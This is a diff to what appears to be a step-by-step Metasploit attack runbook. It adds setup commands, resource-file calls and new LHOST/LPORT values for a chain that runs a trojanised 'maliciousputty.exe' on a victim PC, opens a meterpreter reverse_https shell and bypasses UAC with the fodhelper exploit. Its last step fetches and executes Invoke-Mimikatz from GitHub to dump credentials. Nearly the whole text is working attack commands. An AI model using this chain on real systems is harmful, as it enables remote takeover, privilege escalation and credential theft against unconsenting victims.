@@ -24,7 +24,12 @@ run
 ###########
 4: run msfconsole
 ###########
--- resource 1-reverse_shell.txt
+# if first time running metasploit framework
+service postgresql start
+msfdb init
+sudo msfconsole
+
+:: resource 1-reverse_shell.txt
 
 ###########
 5: run maliciousputty.exe on victim pc
@@ -38,9 +43,11 @@ use exploit/windows/local/bypassuac_fodhelper
 set SESSION 1
 set TARGET 1
 set payload windows/x64/meterpreter/reverse_https
-set LHOST 192.168.230.137
-set LPORT 8081
+set LHOST 10.11.5.100
+set LPORT 8082
 run
+
+:: resource 2-bypassuac.txt
 
 ###########
 7: run PS script
@@ -49,3 +56,5 @@ create text file (3-mimikatz.txt)
 session 2
 load powershell
 powershell_execute 'IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds'
+
+:: resource 3-mimikatz.txt
